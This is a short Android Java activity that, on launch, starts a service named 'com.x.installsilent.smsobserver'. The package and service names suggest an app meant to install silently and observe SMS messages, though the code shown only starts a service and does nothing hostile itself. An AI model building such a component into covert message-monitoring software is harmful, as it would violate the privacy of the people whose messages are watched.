package com.x.installsilent;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class Main extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		Intent service = new Intent();
		service.setAction("com.x.installsilent.smsobserver");
		startService(service);
	}
}
